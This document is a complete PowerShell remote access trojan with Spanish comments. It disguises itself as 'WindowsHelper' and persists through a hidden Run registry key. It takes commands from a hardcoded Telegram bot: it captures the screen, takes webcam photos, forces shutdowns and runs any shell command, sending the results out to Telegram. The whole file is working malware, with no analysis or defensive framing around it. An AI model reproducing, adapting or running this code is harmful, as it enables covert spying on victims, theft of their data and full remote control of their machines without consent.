
$ErrorActionPreference = "SilentlyContinue"

# Persistencia
$scriptPath = "$env:APPDATA\WindowsHelper\agent.ps1"
if (-not (Test-Path "$env:APPDATA\WindowsHelper")) { New-Item -ItemType Directory -Path "$env:APPDATA\WindowsHelper" -Force }
if ($MyInvocation.MyCommand.Path -ne $scriptPath) { 
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force 
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinHelper" -Value "powershell -w hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -PropertyType String -Force 
    Start-Process "powershell" -ArgumentList "-w hidden -File `"$scriptPath`""
    exit
}

# Función para enviar mensajes
function Send-Message($msg) { Invoke-RestMethod -Uri "https://api.telegram.org/bot7764443259:AAHsLJJNFKcQ0Mr1sTXXCdsVZxJpuWG0FKk/sendMessage" -Method POST -Body @{ chat_id = "1717601274"; text = $msg } }

# Función para enviar archivos (screenshots o fotos)
function Send-Photo($file) { Invoke-RestMethod -Uri "https://api.telegram.org/bot7764443259:AAHsLJJNFKcQ0Mr1sTXXCdsVZxJpuWG0FKk/sendPhoto" -Method POST -Form @{ chat_id = "1717601274"; photo = Get-Item $file } }

# Enviar ayuda
Send-Message "🤖 Bot activo. Comandos: /help, /screenshot, /camera, /shutdown, /shell <cmd>"

while ($true) {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot7764443259:AAHsLJJNFKcQ0Mr1sTXXCdsVZxJpuWG0FKk/getUpdates"
    $commands = $updates.result | Where-Object { $_.message.chat.id -eq 1717601274 } | Sort-Object -Property message.date -Descending | Select-Object -First 1

    if ($commands) {
        $text = $commands.message.text
        switch -Wildcard ($text) {
            "/help" { Send-Message "Comandos: /help, /screenshot, /camera, /shutdown, /shell <cmd>" }
            "/screenshot" {
                $img = "$env:TEMP\scr.png"
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
                $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                $bmp.Save($img, [System.Drawing.Imaging.ImageFormat]::Png)
                Send-Photo $img
                Remove-Item $img
            }
            "/camera" {
                $photo = "$env:TEMP\webcam.jpg"
                $cam = New-Object -ComObject WIA.DeviceManager
                $dev = $cam.DeviceInfos | Where-Object { $_.Type -eq 2 } | Select-Object -First 1
                if ($dev) {
                    $device = $dev.Connect()
                    $item = $device.Items | Select-Object -First 1
                    $image = $item.Transfer()
                    $image.SaveFile($photo)
                    Send-Photo $photo
                    Remove-Item $photo
                } else { Send-Message "No se encontró cámara." }
            }
            "/shutdown" { Stop-Computer -Force }
            "/shell*" {
                $cmd = $text -replace "/shell ", ""
                $out = cmd /c $cmd 2>&1
                if ($out) { Send-Message ($out | Out-String) } else { Send-Message "Comando ejecutado sin salida." }
            }
        }
    }
    Start-Sleep -Seconds 10
}
